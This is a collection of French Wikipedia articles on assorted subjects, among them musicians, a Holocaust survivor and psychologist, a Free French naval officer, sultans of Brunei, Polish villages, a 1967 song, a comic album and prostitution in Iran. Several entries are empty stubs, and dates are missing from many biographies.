Michael Corrente (né le ) est un réalisateur et producteur américain. Il a travaillé sur des films tels "Un but pour la gloire", "American Buffalo", "Les Années lycée", "Brooklyn Rules" et ". Ce dernier a remporté le prix du public du Festival du cinéma américain de Deauville en 1994

</doc>
<doc id="9623193" url="https://fr.wikipedia.org/wiki?curid=9623193" title="High Rise">
High Rise



</doc>
<doc id="9623194" url="https://fr.wikipedia.org/wiki?curid=9623194" title="Willy Burmester">
Willy Burmester

Willy Burmester (né le à Hambourg, décédé le dans cette ville) est un violoniste et compositeur allemand.
Biographie et carrière.
Willy Burmester a été l'élève à la Königlichen Hochschule für Musik Berlin de Joseph Joachim, avec qui il a étudié pendant de nombreuses années à Berlin. En 1885, cependant, il a fait sécession de l'école Joachim, et a commencé à développer sa technique en vue de perfectionner sa virtuosité plutôt que de rechercher une pureté classique du style.
À partir de 1886, il a entrepris des tournées de concerts. En 1890, il était premier violon à Sondershausen. Il a vécu à Weimar, Helsinki, Berlin et Darmstadt.
L'interprétation des classiques par Burmester a été décrite comme un peu froide et dépourvue de sentiment. Son goût était suffisamment éclectique pour pouvoir aborder toutes les écoles musicales. Il s'est fait connaître tout particulièrement comme interprète des œuvres de Paganini. Sur le continent, sa réputation était très élevée. Il n'a pas, cependant, fait une grande impression lors de sa première visite en Angleterre et en Amérique, même si les spectateurs ont admiré ses prouesses techniques merveilleuses, en particulier son pizzicato de la main gauche, et sa maîtrise des traits rapides en tierces et dixièmes. Il souffrait cependant d'un handicap car l'extrémité de son premier doigt était tournée vers le bas à cause d'un nerf.
Dans ses dernières années, Burmester avait remédié à ces défauts, et ceux qui l'ont entendu jouer lors de ses concerts, étaient très impressionnés par ses qualités musicales.
Jean Sibelius avait initialement dédié son "Concerto pour violon" à Burmester, qui avait promis de le jouer à Berlin. Pour des raisons financières, Sibelius a décidé de créer l'œuvre à Helsinki en 1903, et comme Burmester était indisponible pour venir en Finlande, Sibelius a engagé Viktor Nováček, professeur de violon au Conservatoire de Helsinki. La première représentation a été un désastre. Sibelius a révisé le concerto et la nouvelle version a été créée en 1905 à Berlin. Willy Burmester a de nouveau demandé à en être le soliste, mais il était de nouveau indisponible, donc le concert a eu lieu sans lui. Le concerto a été interprété par l'Orchestre philharmonique de Berlin sous la direction de Richard Strauss avec Karel Halíř en soliste. Burmester a été si offensé qu'il a renoncé définitivement à jouer ce concerto, et Sibelius a re-dédicacé le concerto à l'« enfant prodige » hongrois Franz von Vecsey.
Compositions.
Willy Burmester a composé une sérénade pour quatuor à cordes et contrebasse, intitulée "Fünfzig Jahre Künstlerleben" ("Cinquante ans de la vie d'un artiste") évoquant des souvenirs autobiographiques. Il a retravaillé des œuvres de Johann Sebastian Bach et Georg Friedrich Haendel et a édité des versions pour violon et piano.

</doc>
<doc id="9623206" url="https://fr.wikipedia.org/wiki?curid=9623206" title="Lossky">
Lossky



</doc>
<doc id="9623212" url="https://fr.wikipedia.org/wiki?curid=9623212" title="Oignon nouveau">
Oignon nouveau



</doc>
<doc id="9623220" url="https://fr.wikipedia.org/wiki?curid=9623220" title="Olga Lossky">
Olga Lossky

Olga Lossky (), née le à Paris, est une écrivaine française.
Biographie.
Olga Lossky est arrière petite fille de Vladimir Lossky, lui-même fils de Nicolas Lossky. Elle est la petite-fille de Nicolas Lossky, prêtre orthodoxe et de Véronique Lossky, professeur de littérature russe et traductrice, Olga est la fille d'André Lossky (né à Paris en 1953, Professeur de Théologie liturgique), leurs fils.
Œuvres.
Romans.
- première sélection du Prix Orange du livre 2016
Nouvelle.
"Le couteau à manche d'ébène", dans "L'esprit de Noël", Éditions Bayard, 2021. 

</doc>
<doc id="9623221" url="https://fr.wikipedia.org/wiki?curid=9623221" title="Robert Francès">
Robert Francès

Robert Francès, né le à Bursa et mort le à Paris, est un professeur de psychologie expérimentale à l’Université Paris X - Nanterre et fondateur en 1966, de l’Association internationale d'esthétique expérimentale. Il publie de nombreux ouvrages et articles consacrés à la psychologie de la musique, de l'esthétique et du travail. Il est également philosophe, musicien, compositeur et écrivain.
Biographie.
Second enfant d’Allègra et Isaac Francès, négociant en soieries de Brousse en Turquie, lui-même fils d'un médecin à la cour du sultan, Robert Francès nait le dans un Empire ottoman vaincu et sur le point d'éclater. Quelques années plus tard, veuve et sans ressource, sa mère, Allègra Rousso, ancienne enseignante à l'Alliance israélite universelle, immigre, en 1925 à Paris, rejoignant ainsi une partie de sa famille. De culture judéo-espagnole et laïque, Robert Francès se convertit au catholicisme alors qu'il est interne au lycée de Beauvais dans l’Oise. Il poursuit des études secondaires au lycée Rollin à Paris où il obtient le baccalauréat en 1938.
À la Sorbonne de Paris, en 1941, il obtient une licence de philosophie suivie en 1942, d’un certificat d’études supérieures de psychologie, de morale, de sociologie et de philosophie générale.
Il s'engage dans la Résistance communiste aux côtés de son condisciple Henri Raymond, depuis la distribution de tracts, jusqu'au recrutement, sous le pseudo de Didier, au sein des FTPF, les Francs-tireurs et partisans Français. L'appartement familial, dans le arrondissement, transformé en imprimerie clandestine, devient une véritable souricière. Robert Francès et sa mère y sont arrêtés en . Emprisonnés à Fresnes, torturés au siège de la Gestapo de la rue des Saussaies, ils sont condamnés à mort, mais après la découverte de leur origine juive, ils sont internés au camp de Drancy puis déportés à Auschwitz le .
Sa mère est gazée dès son arrivée, Robert Francès survit. Il est affecté comme manœuvre au camp de Monowitz-Buna (Auschwitz III), du au , date de l’évacuation du camp, alors commence pour Robert Francès une longue Marche de la mort qui le conduit à travers la Silésie, la Tchécoslovaquie, l’Autriche et la Bavière. Il survit en compagnie d'un autre déporté, en se réfugiant dans une ferme bavaroise. Le , il est libéré et recueilli par l’armée américaine puis rapatrié en France, le . Il est alors décoré de la Médaille de la Résistance et de la Croix de Guerre 1939-1945.
Agrégé de philosophie et professeur de psychologie à l'université de Nanterre, Robert Francès relate sa déportation dans l'ouvrage "Intact aux yeux du monde" pour lequel il reçoit le prix WIZO. En 1987, cet ouvrage est réédité sous le titre "Un déporté brise son silence". Dès son retour de captivité, il reprend ses études et, en 1947, il est reçu au concours de l’Agrégation de Philosophie et épouse Simone Pesle. De cette union, naissent deux garçons, en 1947 et 1952. Son épouse Simone décède brutalement en 1965 laissant Robert Francès avec ses deux garçons adolescents, dont il prend en charge l’éducation, avec dévouement et dignité.
En 1975, il rencontre Georges Lamy, son compagnon, son Parsifal qui l’accompagne fidèlement jusqu’à son lit de mort le à Paris.
Carrière universitaire.
Nommé Professeur de Philosophie au Lycée Carnot de Marseille, il y enseigne jusqu’en 1952. En octobre de la même année, il est nommé chercheur au Centre national de la recherche scientifique (CNRS) à Paris et commence à préparer sa thèse d'État sur la musique. Il termine et soutient sa thèse en 1957 sur la perception de la musique et une thèse complémentaire sur  le développement perceptif  qui lui vaudra une mention : très honorable. 
Entre 1958 et 1963, il mène différentes recherches de psychologie expérimentale qui sont publiées et qui lui valent d’être nommé maître de recherches et de recevoir la médaille de bronze du CNRS. 
En 1965, il est proposé au grade de Directeur de recherches, mais il choisit la voie de l’enseignement supérieur. Il est nommé maître de conférences à la nouvelle Université de Paris X Nanterre où il est promu professeur. 
En 1967, pour promouvoir la recherche dans son équipe, il crée le laboratoire de psychologie expérimentale générale et différentielle, dans lequel sont préparées les thèses des assistants et maîtres-assistants. En 1969, Robert Francès introduit, sous forme d'une filière de formation spécialisée, la recherche sur la psychologie du travail, qui sera suivie par de nombreux étudiants et chercheurs étrangers.
Tout en assumant la direction de l’Institut d’esthétique et des sciences de l’art que lui a transmise Étienne Souriau, il crée parallèlement le laboratoire de psychologie de la Culture, associé au CNRS qu’il dirige jusqu’en 1984. 
Par ailleurs, Robert Francès est membre du Conseil scientifique de Nanterre pendant plusieurs années et élu au Comité national du CNRS Il est le premier Président de l’Association internationale d’esthétique expérimentale, qu’il fonde en 1966, et de la Société française de psychologie de 1971 à 1972. Il est nommé professeur émérite d’université en 1984. Il publie seul ou en collaboration, des articles, des ouvrages et des communications produits lors de Congrès nationaux et internationaux, dont la liste figure dans la bibliographie. 
Parallèlement à ses études philosophiques, Robert Francès reçoit une éducation musicale, apprend à jouer du piano, de la flûte traversière et suit des cours d’harmonie et de composition. Entre 1940 et 1947, des maîtres prestigieux lui dispensent gracieusement leur enseignement : Guy de Lioncourt et Louis Saguer, pour les cours de composition, puis Nadia Boulanger et enfin Betsy Jolas. Comme compositeur Robert Francès écrit des mélodies, des pièces pour piano ou pour flûte et piano, dont plusieurs sont diffusées sur les ondes ou jouées en public.
Apport.
L’après-guerre, en France, voit paraître des livres importants de philosophie de la musique, notamment ceux de Boris de Schlœzer et de Gisèle Brelet. Leur lecture ne manque pas d’intéresser le jeune philosophe musicien, Robert Francès. Il comprend devant ces écrits, que la difficulté d’émettre autre chose qu’un jugement individuel, peut être obscurément déterminé par des motifs inconscients. Écrire sur la musique... oui, mais selon une méthode scientifique, avec un souci de la preuve adaptée à l’objet étudié.
Sous l’influence de Paul Fraisse, il s’initie peu à peu à la méthode expérimentale. Admis en 1952, comme chercheur au Centre National de la Recherche Scientifique, Robert Francès commence, sous la direction d’Étienne Souriau, et d’Ignace Meyerson, les recherches qui doivent aboutir à son premier ouvrage "La perception de la musique", paru en 1958. Ce n’est pas une étude du jugement esthétique, mais celle de la base perceptuelle sur laquelle le jugement s’édifie. Ce qui caractérise ce travail, est le souci de conduire des expériences aussi rigoureuses que possible sur des unités ayant une réalité musicale. La psychologie de la musique avait été développée auparavant, par Hermann von Helmholtz, par Carl Stumpf, par Carl Emil Seashore, à partir d’études faites sur des éléments simples : sons purs isolés ou en combinaisons harmoniques, phénomènes élémentaires, visant à expliquer la consonance ou la dissonance, comme les battements, etc. 
Robert Francès, quant à lui, entreprend une étude de la perception de stimuli musicaux ayant un sens pour les auditeurs : soit des fragments d’œuvres entières, soit des exemples mélodiques ou harmoniques, construits pour mettre en évidence l’action d’une ou plusieurs variables définies au préalable. Autrement dit, la psychologie de la musique doit passer à l’étude d’ensembles sonores, ayant d’emblée une apparence conforme à ce que l’auditeur appelle spontanément de la musique. Cette apparence résulte de l’application des règles du système tonal, syntaxe mélodique et harmonique dont il faut indiquer l’existence intériorisée chez les sujets, même ceux n’ayant aucune éducation musicale. 
De là, toute une série d’expériences visent à montrer l’existence de ce que Robert Francès appelle l’acculturation tonale, un ensemble de schèmes, d’attentes, perceptives acquises dès l’enfance sous l’influence de l’environnement musical. Des expériences sur le sens conclusif des cadences parfaites, sur la mémoire immédiate de courtes mélodies tonales, comparée à celle de mélodies atonales, d’improvisation vocale en partant de l’audition d’un son isolé, révèlent l’existence de ces schèmes, de ces attentes. L’analyse harmonique d’œuvres allant de Johan Sebastian Bach à Duke Ellington, faite selon les principes de la théorie de l’information, présente une permanence étonnante, d’une œuvre à l’autre, de leur structure harmonique. Il y a donc une base socio-linguistique environnementale pour la formation de l’acculturation tonale. 
Ce concept est un des éléments théoriques principaux de "la Perception de la musique". Un autre concept, concerne l’expression et la signification musicale. Robert Francès montre que cette expression a une base non-culturelle, consistant en l’évocation subconsciente, lors de l’audition des œuvres, de schèmes corporels cinétiques ou de schèmes de tension ou de détente, qui définissent des familles de sentiments ou d’états psychologiques. Cette théorie suscite de nombreuses opérationalisations, notamment avec l’étude intitulée Musique et image (1958) et l’étude menée avec Marie-Lou Schweitzer Expression musicale et expression corporelle 1982. Sur cette base s’ajoutent des significations culturelles, naissant de la syntaxe tonale, de son élargissement dans l’époque contemporaine.

</doc>
<doc id="9623222" url="https://fr.wikipedia.org/wiki?curid=9623222" title="Muhammad Jamalul Alam II">
Muhammad Jamalul Alam II

Muhammad Jamalul Alam II, né en 1889 à Bandar Brunei et mort le dans la même ville, est le vingt-sixième sultan du Brunei. Il a régné du à sa mort.

</doc>
<doc id="9623231" url="https://fr.wikipedia.org/wiki?curid=9623231" title="Danny Dog">
Danny Dog



</doc>
<doc id="9623234" url="https://fr.wikipedia.org/wiki?curid=9623234" title="Hashim Jalilul Alam Aqamaddin">
Hashim Jalilul Alam Aqamaddin

Hashim Jalilul Alam Aqamaddin, né en 1825 à Bandar Brunei et mort le dans la même ville, est le vingt-cinquième sultan de Brunei. Il règne du à sa mort.

</doc>
<doc id="9623236" url="https://fr.wikipedia.org/wiki?curid=9623236" title="Roger Birot">
Roger Birot

Roger Birot, né le au Mans et disparu dans l'océan Atlantique le , est un officier de marine et résistant français, compagnon de la Libération. 
Il se distingue dès le début de la Seconde Guerre mondiale par son action dans la lutte anti-sous-marine, puis lors de l'évacuation de Dunkerque. Il rejoint la Royal Navy puis les Forces navales françaises libres. 
Il commande la première corvette de la France libre, puis la de corvettes et participe à la bataille de l'Atlantique en escortant les convois alliés. Il joue un rôle important pour rallier Saint-Pierre-et-Miquelon à la France libre le 24 décembre 1941, et dirige provisoirement le territoire. 
Ayant repris le service à la mer dans l'Atlantique, il commande la corvette "Mimosa" à bord de laquelle il disparait après le torpillage de son bateau par un sous-marin allemand.
Biographie.
Roger Richard Louis Birot naît le au Mans dans le département de la Sarthe. Il est le fils de Jean-Pierre Birot, capitaine d'infanterie, futur général, et de Juliette Millot.
Jeune officier de marine.
Roger Louis effectue sa scolarité au prytanée militaire, à La Flèche. Il entre à l'École navale en . À sa sortie en octobre 1926, il est enseigne de vaisseau de .
Affecté d'abord sur le torpilleur "Sénégalais", il navigue sur le "Ville d'Ys", un aviso, à la station de Terre-Neuve et d'Islande. Promu enseigne de vaisseau de en , il embarque sur le transport pétrolier "Mékong" basé à Cherbourg. 
Il est officier élève de l'École des officiers de transmissions en 1931. Promu lieutenant de vaisseau, il est le chef du service transmissions à bord de plusieurs bâtiments successifs : en 1934 et 1935, sur les contre-torpilleurs "Guépard" puis "Jaguar" ; en 1936, sur le croiseur-école "Jeanne-d'Arc", en 1937 à bord du cuirassé "Paris", enfin en 1939, sur le contre-torpilleur "Lion".
Lutte anti-sous-marine puis évacuation de Dunkerque.
Lieutenant de vaisseau à la déclaration de la Seconde Guerre mondiale le 3 septembre 1939, Roger Birot commande le patrouilleur "La Cancalaise" et la de patrouilleurs auxiliaires avec laquelle il participe activement à la lutte anti-sous-marine. Son navire saute sur une mine le . Blessé, il est recueilli avec son équipage par un vapeur hollandais.
Lorsqu'il est de retour à Dunkerque, il est chargé de la sécurité et de la logistique du port. Il s'illustre de nouveau, lors de l'évacuation de Dunkerque, et le vice-amiral Abrial lui décerne une citation à l’ordre de l'armée de mer, le . Après l'évacuation de Dunkerque, il prend le commandement à Cherbourg, le , du patrouilleur "La Nantaise". Il entend le l'appel du général de Gaulle. Replié à Southampton le , il voit son bâtiment saisi comme les autres par la . Il est promu capitaine de corvette en .
Rallie la France libre.
Après quelques mois dans la , Roger Birot rejoint le les Forces navales françaises libres (FNFL). Il entraîne beaucoup de marins à suivre son exemple. 
D'abord nommé commandant en second du cuirassé "Courbet", il est nommé en janvier 1941 commandant du torpilleur "Bouclier" ; mais celui-ci n'est pas opérationnel et est endommagé par les bombardements allemands sur Plymouth.
Commande une division à la bataille de l'Atlantique.
Il est désigné pour commander la corvette "Mimosa" le . C'est la première corvette des Forces navales françaises libres, elle leur est remise en mai 1941 ; il en dirige l'armement. Trois mois après, il prend le commandement de la de corvettes, comprenant le "Mimosa", l' et l'. 
Il est chargé avec sa division d'escorter des convois alliés entre l'Amérique du Nord et l'Islande. C'est la première formation des FNFL à participer à la bataille de l'Atlantique. Il remplit cette mission d'escorte dans des .
Ralliement de Saint-Pierre-et-Miquelon à la France libre.
Il est promu capitaine de frégate en octobre 1941. Avec le vice-amiral Muselier, à la tête de ses trois corvettes et du sous-marin "Surcouf", il participe en décembre 1941 aux opérations pour rallier Saint-Pierre-et-Miquelon à la France libre, et il y joue un rôle prépondérant. Nommé le commandant provisoire de la marine de Saint-Pierre-et-Miquelon, il y reste jusqu'à l'arrivée du titulaire du poste, l'enseigne de vaisseau Alain Savary. Il repart à la mer en mars 1942 pour continuer ses missions dans l'Atlantique, escortant les convois avec le "Mimosa".
Atteint par une torpille.
Le "Mimosa" appareille de Greenock (Écosse) le , pour escorter à partir du le convoi « ONS 100 » vers l'Amérique du Nord. Mais la corvette est torpillée dans la nuit du 8 au par le sous-marin allemand U 124. À le 'une torpille atteint le bâtiment par 52° 12 nord et 32° 37 ouest, touchant le compartiment machine et faisant exploser les munitions. Le "Mimosa" coule en trois minutes. Le capitaine de frégate Roger Birot ainsi que presque tout son équipage de soixante-cinq marins disparaissent, il n'y a que quatre survivants.
La croix de l'ordre de la Libération est décernée à titre posthume à Roger Birot, ce qui le fait compagnon de la Libération, par décret du .
Hommages et distinctions.
Hommages.
Sont nommés d'après lui : 
L'administration postale de Saint-Pierre-et-Miquelon a émis un timbre à son effigie en 1993.

</doc>
<doc id="9623238" url="https://fr.wikipedia.org/wiki?curid=9623238" title="Olivier Deschizeaux">
Olivier Deschizeaux

Olivier Deschizeaux, né le à Villefranche-sur-Saône, est un poète français. Influencé principalement par Arthur Rimbaud, Allen Ginsberg et André Breton. Il vit à Lyon, où il se consacre à la Poésie. Olivier Deschizeaux est l'auteur d'une œuvre essentiellement construite sous forme de prose, une poésie qui au fil du temps prend l'aspect de poèmes tant allégoriques qu'introspectifs.
Biographie.
Olivier Deschizeaux naît le à Villefranche-sur-Saône, au sein d'une famille franco-espagnole. Après des études mouvementées et quelques années d'errance, Olivier Deschizeaux s'intègre à la vie littéraire au .
En 2003, il rencontre Olivier Rougerie, directeur des éditions Rougerie, et rentre dans ce jardin 'Rougerie' cultivé par René Rougerie, fondateur des éditions à l'après-guerre. Il y publie six livres de poèmes, parmi lesquels "Le Soldat mort, L'Herbe noire, Sinon dans la chair", jusqu'en 2018.
Il publie des recueils de poèmes dès 2004 et des poèmes inédits dans les revues "Verso", "Arpa", "Pyro". En 2010, il est publié dans la revue "Multiples" du "Loup de Lichen". En 2018 paraît dans la revue "Les Hommes sans épaules" une suite de poèmes nommée "L'être intime", puis en 2020, "Sur un piano de nuit" chez Encres Vives"." 
Il participe à quatre livres d'artiste chez Huguet Éditions sous la direction de Michel Sottet : "Orphelinat", "Étranges Noblesses", C"antique de minuit" et "Ma jeunesse".
En 2004, Olivier Deschizeaux est lauréat du prix Louis-Guillaume (prix du poème en prose), pour son premier livre "La Chambre close".
Il est aussi l'invité de nombreux festivals (Lodève, Rochefort, Rennes...). De nombreux articles lui sont consacrés ainsi que des notes de lecture comme en 2018 dans les revues "Europe", "La Quinzaine Littéraire", "Recours au Poème" et le blog de Mediapart.
En 2013, Olivier Deschizeaux fait la connaissance du poète Lionel Bourg à Vienne. Puis, en 2016, il rencontre l'éditrice Christine Brisset Le Mauve. Le premier l'accueille dans sa collection de poésie L'Orpiment au Réalgar (créée par Daniel Damart). La dernière publie trois de ses livres aux éditions L'Arbre ("La nuit profonde", "Le cavalier d'argile", "Et puis un soir").

</doc>
<doc id="9623242" url="https://fr.wikipedia.org/wiki?curid=9623242" title="Peppa Pig-Excursion en montagne">
Peppa Pig-Excursion en montagne



</doc>
<doc id="9623247" url="https://fr.wikipedia.org/wiki?curid=9623247" title="Abdul Momin">
Abdul Momin

Abdul Momin, né le à Bandar Brunei et mort le dans la même ville, est le vingt-quatrième sultan de Brunei. Il règne de 1852 à sa mort.

</doc>
<doc id="9623252" url="https://fr.wikipedia.org/wiki?curid=9623252" title="Louis Mesenkop">
Louis Mesenkop

Louis Henry Mesenkop est un ingénieur du son américain né le dans l'Illinois et mort le à Los Angeles (Californie).
Notes et références.
 Base de données officielle des Oscars

</doc>
<doc id="9623258" url="https://fr.wikipedia.org/wiki?curid=9623258" title="The Letter (chanson)">
The Letter (chanson)

 est une chanson écrite et composée par Wayne Carson et interprétée par le groupe américain The Box Tops. Il s'agit du premier single du groupe, sorti en août 1967. La chanson est ensuite incluse dans l'album "The Letter/Neon Rainbow" sorti en .
Le single se classe en tête du Billboard Hot 100 et connaît un important succès dans le monde.
Alex Chilton, le chanteur du groupe, n'avait que 16 ans lors de l'enregistrement du morceau.
Reprises.
"The Letter" fut reprise par nombre d'artistes, notamment Joe Cocker dont la version sortie en single en 1970 entre dans les charts de plusieurs pays. Une version enregistrée en public figure sur son album live "Mad Dogs and Englishmen" publié en .
Peter Tosh propose une version reggae sous le titre "Give Me a Ticket" en 1970, Amii Stewart, une version disco en 1979.
The Shadows, Trini Lopez, Al Green, l'ont également interprétée. Dès 1967 sortent trois adaptations en français, l'une chantée par Herbert Léonard sous le titre "Une lettre" (reprise en 1971 par Vicky Leandros), une autre par le chanteur québécois Patrick Zabé sous le titre "La Lettre" et une troisième par le groupe québécois Les Misérables sur la face B de leur 45-tours Misérablement vôtre, sur étiquette Jupiter, également sous le titre Une lettre.
Distinctions.
La version originale fait partie de la liste des « 500 plus grandes chansons de tous les temps », établie en 2003 par le magazine "Rolling Stone".
Elle a reçu le Grammy Hall of Fame Award en 2011. Elle est également sélectionnée par le Rock and Roll Hall of Fame, en 1995, comme l'une des « 500 chansons qui ont façonné le rock 'n' roll ».
Utilisations.
La version de Joe Cocker apparait dans le film "Once Upon a Time… in Hollywood" (2019) de Quentin Tarantino.

</doc>
<doc id="9623259" url="https://fr.wikipedia.org/wiki?curid=9623259" title="Biskupie-Kolonia (Wólka)">
Biskupie-Kolonia (Wólka)

Biskupie-Kolonia (prononciation : ) est un village polonais de la gmina de Wólka dans le powiat de Lublin de la voïvodie de Lublin dans l'est de la Pologne.
Le village comptait approximativement une population de en 2014.
Histoire.
De 1975 à 1998, le village est attaché administrativement à l'ancienne Voïvodie de Lublin.&lt;br&gt;
Depuis 1999, il fait partie de la nouvelle voïvodie de Lublin.

</doc>
<doc id="9623260" url="https://fr.wikipedia.org/wiki?curid=9623260" title="18e cérémonie des British Independent Film Awards">
18e cérémonie des British Independent Film Awards

La des (), organisée par le jury du Festival de Raindance, a eu lieu le , et a récompensé les films indépendants réalisés dans l'année.
Les nominations ont été annoncées le .

</doc>
<doc id="9623265" url="https://fr.wikipedia.org/wiki?curid=9623265" title="Biskupie-Kolonia">
Biskupie-Kolonia



</doc>
<doc id="9623266" url="https://fr.wikipedia.org/wiki?curid=9623266" title="Liste des visites pastorales du pape Paul VI hors d'Italie">
Liste des visites pastorales du pape Paul VI hors d'Italie

Durant les quinze années de son pontificat, le pape Paul VI effectua neuf visites pastorales à l'étranger. Il est le premier pape à voyager hors d'Italie depuis Pie VII et le premier à se rendre en Amérique, en Afrique, en Asie et en Océanie. Il est à son époque le pape ayant le plus voyagé, ce qui lui vaut le surnom de « pape pèlerin ». Il a inauguré en cela de nouvelles pratiques diplomatiques pour le Vatican, suivies par ses successeurs. En 1964, il voyage en Terre sainte, où il rencontre le patriarche œcuménique Athénagoras à Jérusalem, ce qui conduit à l'annulation des excommunications du Grand Schisme de 1054. Le pape s'est également rendu au Congrès eucharistique à Bombay, en Inde. Lors de la première visite du pape aux États-Unis, en octobre 1965, Paul VI rencontre le président Lyndon B. Johnson et s'adresse aux Nations unies. Cinquante ans après la première apparition de Notre-Dame de Fátima, il en a visité le sanctuaire, au Portugal, en 1967. Il effectue une visite pastorale en Afrique en 1969. Après un voyage en 1970 dans plusieurs pays asiatiques et du Pacifique, il ne quitte plus l'Italie jusqu'à son décès, le 6 août 1978.

</doc>
<doc id="9623271" url="https://fr.wikipedia.org/wiki?curid=9623271" title="Bystrzyca (Lublin)">
Bystrzyca (Lublin)

Bystrzyca (prononciation : ) est un village polonais de la gmina de Wólka dans le powiat de Lublin de la voïvodie de Lublin dans l'est de la Pologne.
Le village comptait approximativement une population de 466 habitants en 2014.
Histoire.
De 1975 à 1998, le village est attaché administrativement à l'ancienne Voïvodie de Lublin.&lt;br&gt;
Depuis 1999, il fait partie de la nouvelle voïvodie de Lublin.

</doc>
<doc id="9623273" url="https://fr.wikipedia.org/wiki?curid=9623273" title="Omar Ali Saifuddin II">
Omar Ali Saifuddin II

Omar Ali Saifuddin II, né le à Bandar Brunei et mort le dans la même ville, est le vingt-troisième sultan de Brunei. Il règne de 1829 à sa mort.

</doc>
<doc id="9623274" url="https://fr.wikipedia.org/wiki?curid=9623274" title="Kriss de Valnor">
Kriss de Valnor

Kriss de Valnor peut signifier :

</doc>
<doc id="9623276" url="https://fr.wikipedia.org/wiki?curid=9623276" title="Périphérie de l'Attique">
Périphérie de l'Attique



</doc>
<doc id="9623280" url="https://fr.wikipedia.org/wiki?curid=9623280" title="Długie (Lublin)">
Długie (Lublin)

Długie (prononciation : ) est un village polonais de la gmina de Wólka dans le powiat de Lublin de la voïvodie de Lublin dans l'est de la Pologne.
Il se situe à environ à l'est de Jakubowice Murowane (siège de la gmina) et au nord-est de Lublin (siège du powiat et capitale de la voïvodie).
Le village comptait approximativement une population de 327 habitants en 2014.
Histoire.
De 1975 à 1998, le village est attaché administrativement à l'ancienne Voïvodie de Lublin.&lt;br&gt;
Depuis 1999, il fait partie de la nouvelle voïvodie de Lublin.

</doc>
<doc id="9623285" url="https://fr.wikipedia.org/wiki?curid=9623285" title="Musée d'Art de Kuopio">
Musée d'Art de Kuopio

Le Musée d'art de Kuopio () est un musée d'art régional de la Savonie du Nord situé dans le quartier Vahtivuori dans le centre-ville de Kuopio en Finlande.
Description.
Conçu par Kauno Kallio, le Musée d'art est construit à côté de la cathédrale de Kuopio, à proximité de la place du marché.
L'édifice est un ancien comptoir bancaire.
Collections.
Les collections comportent environ 6 700 œuvres majoritairement d'art finlandais.
L'ensemble est la réunion des collections du musée d'art, du musée municipal de Kuopio, d'Oskar Huttunen, de Risto Vilhunen et de Pekka Halonen ainsi que d’autres collections.
La collection du musée d'art présente plus de 800 œuvres, la plupart d'art moderne de Savonie et de classiques de l'histoire de l'art du au .
On peut y voir entre autres des œuvres de Juho Rissanen et des 
La collection du musée municipal de Kuopio compose plus de 1900 œuvres qui sont pour la plupart réparties dans différentes endroits publics de la ville.
La collection d'Oskar Huttunen riche de 91 œuvres a été cédée dans son testament par Oskar Huttunen à la ville.
Cédée en 2010, la collection de Risto Vilhunen comporte plus de 2000 objets en majorité des dessins et ouvrages graphiques finlandais modernes.
Depuis 2008, le musée d'art est dépositaire de la collection de 150 œuvres de Pekka Halonen, qui regroupe principalement des peintres finlandais et internationaux des années 1980.
Parmi les autres, citons les collections de et de J. Fr. Tuhkanen.

</doc>
<doc id="9623296" url="https://fr.wikipedia.org/wiki?curid=9623296" title="Zaï zaï zaï zaï">
Zaï zaï zaï zaï

Zaï zaï zaï zaï est un album de bande dessinée de Fabcaro publié chez 6 Pieds sous terre en 2015. Il s'est vendu à plus de 400 000 exemplaires.
Synopsis.
Au passage à la caisse d'un supermarché, un auteur de bande dessinée réalise qu’il n’a pas sa carte de fidélité. Le vigile intervient à la demande de la caissière mais l’auteur le menace avec un poireau puis parvient à s’enfuir.
Titre.
Le titre provient de la chanson de Joe Dassin, "Siffler sur la colline". La ritournelle du refrain devient le titre de la bande dessinée qui brocarde la société de consommation en décrivant le "road movie" du héros, traqué et finalement condamné à chanter "Siffler sur la colline" dans un karaoké en public pour avoir oublié sa « carte du magasin ».
Propos de l'auteur.
En commentant trois planches de l'album pour telerama.fr, Fabcaro explique sa démarche :
Adaptations.
Radio.
L'émission « Mégacombi » de Radio Canut adapte la bande dessinée en pièce radiophonique en 2017. La première diffusion a lieu le , puis le podcast est mis en ligne sur Arte radio.
Théâtre.
Dans une interview à "Libération" le , Fabcaro déclare que :
Cinéma.
En , Fabcaro annonce que les droits d'adaptation cinématographique ont été cédés. La cinéaste Rebecca Zlotowski travaille à un premier projet d'adaptation (co-écrit avec Thomas Cailley) avant de jeter l'éponge. C'est ensuite François Desagnat qui récupère les droits. Son film, tourné en partie à Montpellier, sort en février 2022.

</doc>
<doc id="9623302" url="https://fr.wikipedia.org/wiki?curid=9623302" title="Rebecca Rabbit">
Rebecca Rabbit



</doc>
<doc id="9623303" url="https://fr.wikipedia.org/wiki?curid=9623303" title="Muhammad Shah (Brunei)">
Muhammad Shah (Brunei)

Muhammad Shah est le premier sultan de Brunei. Il règne de 1368 à sa mort en 1402.

</doc>
<doc id="9623304" url="https://fr.wikipedia.org/wiki?curid=9623304" title="Petteri Lindbohm">
Petteri Lindbohm

Petteri Lindbohm (né le à Helsinki) est un joueur professionnel finlandais de hockey sur glace. Il évolue au poste de défenseur.
Biographie.
Carrière en club.
Formé au HIFK, il rejoint les équipes de jeunes du Kiekko-Vantaa. Il débute en senior avec l'équipe première dans la Mestis, le deuxième niveau national en 2012. Il est choisi au sixième tour en cent-soixante-seizième position par les Blues de Saint-Louis lors du repêchage d'entrée 2012 de la Ligue nationale de hockey. En 2012-2013, il découvre la SM-liiga avec le Jokerit Helsinki. Il part en Amérique du Nord en 2014 est assigné aux Wolves de Chicago, club école des Blues dans la Ligue américaine de hockey. Le , il joue son premier match dans la Ligue nationale de hockey avec les Blues chez les Ducks d'Anaheim. Il marque son premier but dans la LNH le face aux Bruins de Boston.
Carrière en équipe nationale.
Il représente la Finlande en sélections jeunes.

</doc>
<doc id="9623307" url="https://fr.wikipedia.org/wiki?curid=9623307" title="Prostitution en Iran">
Prostitution en Iran

La prostitution en Iran est illégale et encourt de nombreuses sanctions, allant des amendes et peines d'emprisonnement à l’exécution pour les récidivistes.
Histoire.
Le nombre exact de prostituées travaillant en Iran est inconnu. Néanmoins, les prostituées sont visibles dans certains coins de rues des grandes villes. Nombre d’entre elles sont des fugueuses issues de foyers pauvres et brisés. En 2002, le journal iranien Entekhab a estimé qu’il y avait quelque 85 000 prostituées seulement à Téhéran. La prostitution est rampante à Téhéran ; « les rues sont pleines de travailleuses... partie du paysage, se mélangeant à tout le reste ».
Les descentes de police ont aussi mis au jour des cercles de prostitution enfantine. 
Un psychiatre iranien, Mahdis Kamkar, considère que la montée de la prostitution est un symptôme de problèmes sociaux plus vastes, dont « les familles dysfonctionnelles, le divorce, les crises d’identité et les contradictions sociales ».
